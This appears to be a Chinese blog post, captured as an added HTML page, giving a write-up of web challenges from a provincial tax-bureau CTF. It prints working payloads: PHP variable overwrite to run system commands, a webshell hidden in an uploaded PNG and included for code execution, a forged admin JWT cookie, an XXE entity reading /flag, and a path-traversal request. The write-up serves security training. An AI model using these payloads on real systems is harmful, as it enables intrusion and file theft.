@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="某省税务比赛题目CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某省税务比赛题目CTF">
+<meta property="og:url" content="https://npfs06.top/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/index.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="某省税务比赛题目CTF">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.npfs06.top/20231123103417.png">
+<meta property="og:image" content="https://img.npfs06.top/20231123103528.png">
+<meta property="og:image" content="https://img.npfs06.top/20231123104330.png">
+<meta property="og:image" content="https://img.npfs06.top/20231123104146.png">
+<meta property="og:image" content="https://img.npfs06.top/20231123104445.png">
+<meta property="og:image" content="https://img.npfs06.top/20231123140401.png">
+<meta property="article:published_time" content="2023-11-23T02:00:25.000Z">
+<meta property="article:modified_time" content="2023-11-23T02:00:25.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.npfs06.top/20231123103417.png">
+
+<link rel="canonical" href="https://npfs06.top/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>某省税务比赛题目CTF | 安小琪's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://npfs06.top/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="安小琪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安小琪's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          某省税务比赛题目CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-23 10:00:25" itemprop="dateCreated datePublished" datetime="2023-11-23T10:00:25+08:00">2023-11-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">web入门</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>某省税务比赛题目CTF</p>
+<a id="more"></a>
+
+<h2 id="web832"><a href="#web832" class="headerlink" title="web832"></a>web832</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网络安全为人民</span><br></pre></td></tr></table></figure>
+<h2 id="web833"><a href="#web833" class="headerlink" title="web833"></a>web833</h2><p>根据提示，让问url/robots.txt，然后下载check.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$index</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$index</span>;</span><br><span class="line">    <span class="variable">$filter</span>=[<span class="string">&quot;strip_tags&quot;</span>,<span class="string">&quot;addslashes&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$index</span>?<span class="variable">$filter</span>[<span class="number">1</span>]:<span class="variable">$filter</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHandle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=getFilter();</span><br><span class="line">    <span class="variable">$say</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$array</span></span>) <span class="title">use</span> (<span class="params">&amp;<span class="variable">$filter</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="variable">$array</span>);</span><br><span class="line">        <span class="variable">$hello</span>=<span class="variable">$filter</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$hello</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span>=getHandle();</span><br><span class="line"><span class="variable">$message</span>=<span class="string">&quot;hello &quot;</span>.<span class="variable">$msg</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码匿名函数那部分有点难懂，借用gpt的解释</p>
+<p><img src="https://img.npfs06.top/20231123103417.png"></p>
+<p>对于匿名函数中的$array变量来源可以这么理解</p>
+<p><img src="https://img.npfs06.top/20231123103528.png"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/<span class="keyword">check</span>.php?<span class="keyword">filter</span>=<span class="keyword">system</span>，然后POST传入<span class="type">name</span>=cat /flag_is_here</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="web834"><a href="#web834" class="headerlink" title="web834"></a>web834</h2><p>仔细审题  秘钥111111</p>
+<p><img src="https://img.npfs06.top/20231123104330.png"></p>
+<p>任意用户注册，修改密码，抓包，注意到cookie有个username，像jwt格式</p>
+<p><img src="https://img.npfs06.top/20231123104146.png"></p>
+<p>改成admin  , 秘钥111111</p>
+<p><img src="https://img.npfs06.top/20231123104445.png"></p>
+<p>替换原cookie， 成功修改admin密码</p>
+<h2 id="web835"><a href="#web835" class="headerlink" title="web835"></a>web835</h2><ol>
+<li>根据题目提示，输入admin 123456登陆</li>
+<li>根据提示，文件是hbsw7.zip</li>
+<li>打开源码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">        doUpload();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;include&quot;</span>:</span><br><span class="line">        doInclude();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="string">&quot;nothing here&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doInclude</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/log|php|tmp/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error filenname&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doUpload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span>=file_get_contents(<span class="variable">$tmp_name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_filename(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_content(<span class="variable">$content</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file(<span class="variable">$tmp_name</span>,<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传成功,文件路径为  /var/www/html/upload/&quot;</span>.<span class="variable">$file</span>];</span><br><span class="line">    <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_filename</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ban_ext</span>=<span class="keyword">array</span>(<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = end(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">return</span> !in_array(<span class="variable">$file_ext</span>,<span class="variable">$ban_ext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_content</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/php|include|require|get|post|request/i&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>api.php对action进行传参，即url/api.php?action=，upload是上传文件，include是包含文件</p>
+<p>可以查看源码:只能上传jpeg和png图片，并且会对内容进行检查，内容不能含有php|include|require|get|post|request</p>
+<ol start="4">
+<li>先上传一个png图片，里面嵌入php代码，然后进行上传</li>
+</ol>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&quot;cat ./F*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后对上传的文件进行包含吗，即可得到flag</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：url/api.php?action=<span class="keyword">include</span></span><br><span class="line">POST: filename=<span class="regexp">/var/</span>www<span class="regexp">/html/u</span>pload/a.png</span><br></pre></td></tr></table></figure>
+
+
+<p>注：include 会执行包含的任意格式文件里的php代码</p>
+<h2 id="web836"><a href="#web836" class="headerlink" title="web836"></a>web836</h2><p>二次报错注入</p>
+<p><img src="https://img.npfs06.top/20231123140401.png"></p>
+<h2 id="web837"><a href="#web837" class="headerlink" title="web837"></a>web837</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mytest</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">config</span> <span class="attr">name</span>=<span class="string">&quot;shutdown&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/usr/local/bin<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execute</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">execute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">args</span>&gt;</span>-clear<span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configs</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web838"><a href="#web838" class="headerlink" title="web838"></a>web838</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/file/</span>download?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>../flag</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>安小琪
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://npfs06.top/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/" title="某省税务比赛题目CTF">https://npfs06.top/2023/11/23/某省税务比赛题目CTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/25/kali%E8%BF%9E%E6%8E%A5hackthebox%E7%9A%84vpn%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="prev" title="kali连接hackthebox的vpn失败的解决方法">
+      <i class="fa fa-chevron-left"></i> kali连接hackthebox的vpn失败的解决方法
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web832"><span class="nav-number">1.</span> <span class="nav-text">web832</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web833"><span class="nav-number">2.</span> <span class="nav-text">web833</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web834"><span class="nav-number">3.</span> <span class="nav-text">web834</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web835"><span class="nav-number">4.</span> <span class="nav-text">web835</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web836"><span class="nav-number">5.</span> <span class="nav-text">web836</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web837"><span class="nav-number">6.</span> <span class="nav-text">web837</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web838"><span class="nav-number">7.</span> <span class="nav-text">web838</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">105</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
